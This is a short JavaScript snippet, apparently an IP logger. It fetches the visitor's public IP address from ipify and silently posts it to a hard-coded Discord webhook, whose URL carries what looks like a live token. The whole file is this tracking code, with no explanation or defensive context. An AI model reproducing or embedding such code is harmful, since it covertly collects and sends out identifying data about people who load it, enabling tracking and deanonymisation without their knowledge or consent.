const webhookUrl = 'https://discord.com/api/webhooks/1308801744431611998/xH8S8JcFUonyR9Ov0dvPUDd4W3mhYiQgV5X87VGuUorCjRwNpMrMPWk9mGT65VSyyTIw';
const xhr = new XMLHttpRequest();
xhr.open('POST', webhookUrl, true);
xhr.setRequestHeader('Content-Type', 'application/json');

fetch('https://api.ipify.org?format=json')
  .then(response => response.json())
  .then(data => {
    const ip = data.ip;
    const payload = { content: `IP: ${ip}` };
    xhr.send(JSON.stringify(payload));
  });
